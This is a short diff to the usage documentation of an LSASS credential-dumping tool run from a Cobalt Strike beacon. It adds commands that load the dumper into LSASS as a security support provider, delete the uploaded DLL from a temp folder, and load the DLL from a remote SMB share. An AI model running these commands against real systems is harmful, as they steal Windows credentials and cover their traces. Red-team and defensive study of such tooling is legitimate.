@@ -147,9 +147,15 @@ Get the PID of LSASS:
 beacon> nanodump --getpid
 ```
 
-Load nanodump in LSASS as an SSP:
+Load nanodump in LSASS as an SSP (a nanodump binary will be uploaded!):
 ```
 beacon> load_ssp
+beacon> delete_file C:\Windows\Temp\[RANDOM].dll
+```
+
+Load nanodump in LSASS as an SSP remotely:
+```
+beacon> load_ssp \\10.10.10.10\openShare\nanodump_ssp.x64.dll
 ```
 
 ## HTTPS redirectors
